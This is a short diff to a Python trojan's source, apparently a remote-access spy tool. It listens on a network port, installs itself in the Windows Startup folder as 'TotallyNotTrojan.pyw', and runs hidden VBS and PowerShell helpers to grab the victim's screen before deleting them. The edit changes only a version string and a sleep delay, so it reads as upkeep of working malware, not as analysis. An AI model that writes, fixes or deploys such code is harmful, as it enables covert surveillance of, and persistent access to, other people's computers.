@@ -1,5 +1,5 @@
 import socket, os, time, ctypes
-from random import randint;VERSION = "BUILD 15.LIMA (Perfmon screenshotter)"
+from random import randint;VERSION = "BUILD 16.LIMA (Perfmon screenshotter-FIXED)"
 sock = socket.socket();sock.bind(("", 9081));sock.listen(10)
 import sys, getpass
 boot = "C:/Users/"+getpass.getuser()+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/TotallyNotTrojan.pyw"
@@ -94,7 +94,7 @@ shell.Run command,0, false
         initializer.write(initializer_p)
         initializer.close()
     os.popen("scr.vbs")
-    time.sleep(1)
+    time.sleep(5)
     data = open("result.png", "rb").read()
     os.remove("scr.vbs")
     os.remove("scr.ps1")
